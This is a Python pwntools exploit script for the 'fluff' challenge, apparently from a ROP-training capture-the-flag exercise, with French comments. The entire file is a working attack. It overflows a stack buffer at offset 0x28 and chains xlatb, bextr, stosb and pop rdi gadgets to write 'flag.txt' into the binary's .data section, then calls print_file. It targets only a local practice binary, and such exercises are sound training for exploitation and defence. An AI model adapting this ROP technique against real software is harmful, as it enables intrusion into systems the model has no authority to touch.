#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time
import sys

# break apres le read dans pwnme
gs='''
b *pwnme+150
c
'''

# Gadgets 
# xlatb; ret
g_xlatb=0x00400628
# pop rdx ; pop rcx ; add rcx, 0x3ef2 ; bextr rbx, rcx, rdx ; ret
g_bextr = 0x0040062a
# stosb byte [rdi], al; ret
g_stosb = 0x00400639
# pop rdi ; ret
g_pop_rdi = 0x4006a3 


def load_al_from_addr(addr, al):
    r=p64(g_bextr)
    r+=p64(64<<8)
    r+=p64(addr-0x3ef2-al)
    r+=p64(g_xlatb)
    return r

def write_al_to_addr(addr):
    r=p64(g_pop_rdi)
    r+=p64(addr)
    r+=p64(g_stosb)
    return r
    

# Offset avant ecrasement de l'adresse de retour
offset=0x28

# Set up pwntools for the correct architecture
elf =  ELF('fluff')
context.binary=elf

print_file=elf.plt['print_file']

data_s = elf.get_section_by_name('.data').header['sh_addr']

flag_txt = [0x4003c4, 0x4003c5, 0x4005d2, 0x4003cf, 0x400436,  0x4006cb, 0x4006c8, 0x4006cb]
lst_al = b"\x0bflag.txt"

PL =b"A"*offset
for i, letter_addr in enumerate(flag_txt):
    PL += load_al_from_addr(letter_addr,lst_al[i])
    PL += write_al_to_addr(data_s+i)

PL+=p64(g_pop_rdi)
PL+=p64(data_s)
PL+=p64(print_file)

io = process([elf.path])
if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)
    #io = gdb.debug([elf.path],gdbscript=gs)

# io.recvuntil(b"> ")
io.sendline(PL)
io.interactive()

